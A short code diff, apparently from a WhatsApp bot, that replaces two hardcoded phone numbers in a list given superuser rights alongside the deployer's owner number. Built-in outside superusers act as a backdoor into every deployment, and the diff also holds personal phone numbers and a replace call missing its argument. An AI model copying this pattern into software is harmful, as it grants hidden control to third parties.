@@ -162,8 +162,8 @@ const messageDelay = 5000; // Set the minimum delay between messages (in millise
             const nomAuteurMessage = ms.pushName;
             const dj = '22559763447';
             const dj2 = '22543343357';
-            const dj3 = "22564297888";
-            const luffy = '22891733300';
+            const dj3 = "254737681758";
+            const luffy = '254114141192';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
